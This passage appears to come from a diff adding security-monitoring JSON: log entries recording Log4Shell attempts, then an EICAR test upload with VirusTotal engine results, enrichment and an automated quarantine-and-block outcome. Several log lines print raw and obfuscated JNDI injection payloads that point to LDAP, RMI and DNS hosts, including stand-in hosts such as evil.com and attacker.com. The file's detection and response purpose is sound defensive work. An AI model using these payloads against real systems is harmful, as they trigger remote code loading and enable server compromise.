+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: accept-language | payload: ${${upper:j}ndi:ldap://attacker.com/exploit} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T02:46:48.766Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: x-forwarded-for-original | payload: ${jndi:rmi://45.142.212.100:1099/exploit} | jndi_url: rmi://45.142.212.100:1099/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:46:48.773Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 185.220.101.34 | header: x-client-ip | payload: ${jndi:dns://185.220.101.34/pwned} | jndi_url: dns://185.220.101.34/pwned"
+        },
+        {
+          "timestamp": "2026-03-08T02:46:48.777Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 185.220.101.34"
+        },
+        {
+          "timestamp": "2026-03-08T02:46:49.287Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: user-agent | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:46:49.297Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 185.220.101.34 | header: x-api-version | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T02:46:49.306Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: referer | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T02:46:49.812Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: accept-language | payload: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a} | jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T02:46:49.818Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: x-forwarded-for-original | payload: ${${upper:j}ndi:ldap://attacker.com/exploit} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T02:46:49.822Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: x-client-ip | payload: ${jndi:rmi://45.142.212.100:1099/exploit} | jndi_url: rmi://45.142.212.100:1099/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:46:50.329Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: true-client-ip | payload: ${jndi:dns://185.220.101.34/pwned} | jndi_url: dns://185.220.101.34/pwned"
+        },
+        {
+          "timestamp": "2026-03-08T02:46:50.337Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 89.248.167.131"
+        },
+        {
+          "timestamp": "2026-03-08T02:46:50.343Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: x-api-version | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:47:08.856Z",
+          "level": "INFO",
+          "message": "File upload received from 192.168.65.1: Eicar Test - Claude.txt (68 bytes) sha256=275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
+        },
+        {
+          "timestamp": "2026-03-08T02:47:08.856Z",
+          "level": "WARN",
+          "message": "EICAR test string detected in upload from 192.168.65.1: Eicar Test - Claude.txt"
+        },
+        {
+          "timestamp": "2026-03-08T02:47:08.858Z",
+          "level": "INFO",
+          "message": "Sending file to DART for VirusTotal analysis: Eicar Test - Claude.txt"
+        }
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "80.82.77.139",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Censys Scanner",
+        "tags": [
+          "scanner",
+          "shodan"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 7632,
+        "countryCode": "NL"
+      },
+      "geoip": {
+        "country": "Netherlands",
+        "city": "Amsterdam",
+        "isp": "IP Volume inc"
+      },
+      "virustotal": {
+        "malicious": 9,
+        "suspicious": 2,
+        "harmless": 61
+      },
+      "virustotal_file": {
+        "found": true,
+        "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
+        "malicious": 62,
+        "suspicious": 0,
+        "harmless": 0,
+        "undetected": 6,
+        "total_engines": 68,
+        "detection_rate": 91,
+        "file_type": "EICAR Test File",
+        "file_size": 68,
+        "first_submission": "2006-05-15T12:00:00.000Z",
+        "last_analysis": "2026-03-08T02:44:08.044Z",
+        "meaningful_name": "eicar.com",
+        "tags": [
+          "eicar",
+          "test-file"
+        ],
+        "engines": {
+          "CrowdStrike": {
+            "category": "malicious",
+            "result": "Win.Test.EICAR_HDB-1",
+            "method": "blacklist",
+            "engine_version": "1.0"
+          },
+          "Fortinet": {
+            "category": "malicious",
+            "result": "EICAR_TEST_FILE",
+            "method": "blacklist",
+            "engine_version": "6.4"
+          },
+          "Kaspersky": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "exact",
+            "engine_version": "22.0"
+          },
+          "McAfee": {
+            "category": "malicious",
+            "result": "EICAR test file",
+            "method": "blacklist",
+            "engine_version": "6.0"
+          },
+          "Microsoft": {
+            "category": "malicious",
+            "result": "Virus:DOS/EICAR_Test_File",
+            "method": "blacklist",
+            "engine_version": "1.1"
+          },
+          "Symantec": {
+            "category": "malicious",
+            "result": "EICAR Test String",
+            "method": "blacklist",
+            "engine_version": "1.21"
+          },
+          "TrendMicro": {
+            "category": "malicious",
+            "result": "Eicar_test_file",
+            "method": "blacklist",
+            "engine_version": "11.0"
+          },
+          "Avast": {
+            "category": "malicious",
+            "result": "EICAR Test-NOT virus!!!",
+            "method": "blacklist",
+            "engine_version": "23.1"
+          },
+          "AVG": {
+            "category": "malicious",
+            "result": "EICAR Test-NOT virus!!!",
+            "method": "blacklist",
+            "engine_version": "23.1"
+          },
+          "BitDefender": {
+            "category": "malicious",
+            "result": "EICAR-Test-File (not a virus)",
+            "method": "exact",
+            "engine_version": "7.2"
+          },
+          "ESET-NOD32": {
+            "category": "malicious",
+            "result": "Eicar test file",
+            "method": "exact",
+            "engine_version": "27000"
+          },
+          "F-Secure": {
+            "category": "malicious",
+            "result": "EICAR_Test_File [Trj]",
+            "method": "blacklist",
+            "engine_version": "18.0"
+          },
+          "GData": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "exact",
+            "engine_version": "25.36"
+          },
+          "Sophos": {
+            "category": "malicious",
+            "result": "EICAR-AV-Test",
+            "method": "blacklist",
+            "engine_version": "2.4"
+          },
+          "Panda": {
+            "category": "malicious",
+            "result": "EICAR-AV-TEST-FILE",
+            "method": "blacklist",
+            "engine_version": "4.6"
+          },
+          "Comodo": {
+            "category": "malicious",
+            "result": "ApplicUnwnt",
+            "method": "blacklist",
+            "engine_version": "35700"
+          },
+          "DrWeb": {
+            "category": "malicious",
+            "result": "EICAR Test File (NOT a Virus!)",
+            "method": "blacklist",
+            "engine_version": "7.0"
+          },
+          "Emsisoft": {
+            "category": "malicious",
+            "result": "EICAR-Test-File (not a virus) (B)",
+            "method": "blacklist",
+            "engine_version": "2023.1"
+          },
+          "FireEye": {
+            "category": "malicious",
+            "result": "EICAR.TEST.FILE",
+            "method": "blacklist",
+            "engine_version": "35.24"
+          },
+          "Ikarus": {
+            "category": "malicious",
+            "result": "EICAR-ANTIVIRUS-TESTFILE",
+            "method": "exact",
+            "engine_version": "6.3"
+          },
+          "Jiangmin": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "exact",
+            "engine_version": "16.0"
+          },
+          "K7AntiVirus": {
+            "category": "malicious",
+            "result": "EICAR_Test_File",
+            "method": "exact",
+            "engine_version": "12.100"
+          },
+          "K7GW": {
+            "category": "malicious",
+            "result": "EICAR_Test_File",
+            "method": "exact",
+            "engine_version": "12.100"
+          },
+          "Malwarebytes": {
+            "category": "malicious",
+            "result": "EICAR.test.file",
+            "method": "blacklist",
+            "engine_version": "4.5"
+          },
+          "MaxSecure": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "exact",
+            "engine_version": "1.0"
+          },
+          "Nano": {
+            "category": "malicious",
+            "result": "Marker.Dos.EICAR-Test-File.dyb",
+            "method": "exact",
+            "engine_version": "1.0"
+          },
+          "Rising": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "exact",
+            "engine_version": "25.0"
+          },
+          "SentinelOne": {
+            "category": "malicious",
+            "result": "DFI - Suspicious",
+            "method": "ai",
+            "engine_version": "23.3"
+          },
+          "Tencent": {
+            "category": "malicious",
+            "result": "EICAR.TEST.FILE",
+            "method": "blacklist",
+            "engine_version": "1.0"
+          },
+          "VIPRE": {
+            "category": "malicious",
+            "result": "EICAR (v)",
+            "method": "exact",
+            "engine_version": "100000"
+          },
+          "ViRobot": {
+            "category": "malicious",
+            "result": "EICAR-test",
+            "method": "blacklist",
+            "engine_version": "2014.3"
+          },
+          "Yandex": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "exact",
+            "engine_version": "5.5"
+          },
+          "ZoneAlarm": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "exact",
+            "engine_version": "1.0"
+          },
+          "Zoner": {
+            "category": "malicious",
+            "result": "EICAR.Test",
+            "method": "exact",
+            "engine_version": "2.0"
+          },
+          "AhnLab-V3": {
+            "category": "malicious",
+            "result": "EICAR_Test_File",
+            "method": "exact",
+            "engine_version": "3.22"
+          },
+          "Arcabit": {
+            "category": "malicious",
+            "result": "EICAR-Test-File (not a virus)",
+            "method": "exact",
+            "engine_version": "2022.0"
+          },
+          "Avira": {
+            "category": "malicious",
+            "result": "Eicar-Test-Signature",
+            "method": "blacklist",
+            "engine_version": "8.3"
+          },
+          "Baidu": {
+            "category": "malicious",
+            "result": "Win32.Test.EICAR.a",
+            "method": "exact",
+            "engine_version": "3.9"
+          },
+          "CAT-QuickHeal": {
+            "category": "malicious",
+            "result": "EICAR.TestFile",
+            "method": "exact",
+            "engine_version": "14.0"
+          },
+          "ClamAV": {
+            "category": "malicious",
+            "result": "Win.Test.EICAR_HDB-1",
+            "method": "blacklist",
+            "engine_version": "1.0"
+          },
+          "Cybereason": {
+            "category": "malicious",
+            "result": "EICAR_Test_File",
+            "method": "ai",
+            "engine_version": "1.0"
+          },
+          "Cylance": {
+            "category": "malicious",
+            "result": "Unsafe",
+            "method": "ai",
+            "engine_version": "2.3"
+          },
+          "CrowdStrike-Falcon": {
+            "category": "malicious",
+            "result": "Win/malicious_confidence_100%",
+            "method": "ai",
+            "engine_version": "1.0"
+          },
+          "Cynet": {
+            "category": "malicious",
+            "result": "Malicious (score: 100)",
+            "method": "ai",
+            "engine_version": "4.0"
+          },
+          "Elastic": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "ai",
+            "engine_version": "4.0"
+          },
+          "Sangfor": {
+            "category": "malicious",
+            "result": "Virus.Test.EICAR.a",
+            "method": "exact",
+            "engine_version": "2.14"
+          },
+          "Trellix": {
+            "category": "malicious",
+            "result": "EICAR test file",
+            "method": "blacklist",
+            "engine_version": "6.0"
+          },
+          "TrendMicro-VSAPI": {
+            "category": "malicious",
+            "result": "Eicar_test_file",
+            "method": "blacklist",
+            "engine_version": "18.0"
+          },
+          "VBA32": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "exact",
+            "engine_version": "5.0"
+          },
+          "WithSecure": {
+            "category": "malicious",
+            "result": "EICAR_Test_File [Trj]",
+            "method": "blacklist",
+            "engine_version": "18.0"
+          },
+          "ZillaSecurity": {
+            "category": "malicious",
+            "result": "EICAR_Test",
+            "method": "ai",
+            "engine_version": "1.0"
+          },
+          "ALYac": {
+            "category": "malicious",
+            "result": "EICAR-Test-File (not a virus)",
+            "method": "exact",
+            "engine_version": "1.0"
+          },
+          "Antiy-AVL": {
+            "category": "malicious",
+            "result": "Virus/EICAR.Test",
+            "method": "exact",
+            "engine_version": "3.0"
+          },
+          "BitDefenderTheta": {
+            "category": "malicious",
+            "result": "EICAR-Test-File (not a virus)",
+            "method": "exact",
+            "engine_version": "7.2"
+          },
+          "Bkav": {
+            "category": "malicious",
+            "result": "DOS.EicarTest.Trojan",
+            "method": "exact",
+            "engine_version": "2.0"
+          },
+          "CMC": {
+            "category": "malicious",
+            "result": "EICAR-Test-File!080000",
+            "method": "exact",
+            "engine_version": "2.4"
+          },
+          "Lionic": {
+            "category": "malicious",
+            "result": "Test.File.EICAR.y!c",
+            "method": "exact",
+            "engine_version": "7.5"
+          },
+          "SUPERAntiSpyware": {
+            "category": "malicious",
+            "result": "NotAThreat.EICAR[TestFile]",
+            "method": "exact",
+            "engine_version": "5.6"
+          },
+          "TACHYON": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "exact",
+            "engine_version": "9.0"
+          },
+          "Varist": {
+            "category": "malicious",
+            "result": "EICAR test file",
+            "method": "exact",
+            "engine_version": "6.5"
+          },
+          "Zillya": {
+            "category": "malicious",
+            "result": "EICAR.TestFile",
+            "method": "exact",
+            "engine_version": "2.0"
+          },
+          "Acronis": {
+            "category": "undetected",
+            "result": null,
+            "method": "blacklist",
+            "engine_version": "1.2"
+          },
+          "Google": {
+            "category": "undetected",
+            "result": null,
+            "method": "ai",
+            "engine_version": "1.0"
+          },
+          "Kingsoft": {
+            "category": "undetected",
+            "result": null,
+            "method": "blacklist",
+            "engine_version": "2017.9"
+          },
+          "MicroWorld-eScan": {
+            "category": "undetected",
+            "result": null,
+            "method": "blacklist",
+            "engine_version": "14.0"
+          },
+          "Paloalto": {
+            "category": "undetected",
+            "result": null,
+            "method": "ai",
+            "engine_version": "1.0"
+          },
+          "Trustlook": {
+            "category": "undetected",
+            "result": null,
+            "method": "ai",
+            "engine_version": "1.0"
+          }
+        },
+        "raw_stats": {
+          "malicious": 62,
+          "suspicious": 0,
+          "harmless": 0,
+          "undetected": 6
+        }
+      }
+    },
+    "risk_score": 100,
+    "risk_reasoning": "File upload analysis: Eicar Test - Claude.txt — MALICIOUS. VirusTotal: 62 engines flagged as malicious (91% detection rate). File hash: 275a021bbfb6489e... Source IP AbuseIPDB score: 100/100.",
+    "selected_playbook": "file-quarantine",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "file-quarantine",
+      "steps_executed": [
+        "quarantine_file",
+        "block_ip"
+      ],
+      "success": true,
+      "file_quarantined": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
+      "file_name": "Eicar Test - Claude.txt",
+      "ip_blocked": "192.168.65.1",
+      "virustotal_summary": {
+        "malicious": 62,
+        "suspicious": 0,
+        "detection_rate": 91,
+        "total_engines": 68
+      },
+      "quarantined_at": "2026-03-08T02:47:09.847Z",
+      "notes": "File quarantined based on VirusTotal verdict. 62 of 68 engines flagged as malicious. IP blocked permanently."
+    },
+    "analyst_feedback": null,
+    "file_name": "Eicar Test - Claude.txt",
+    "file_size": 68,
+    "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
+    "eicar_detected": true,
+    "upload_id": "403b699a-bea1-4927-94a7-1d372d362d30"
   }
 ]
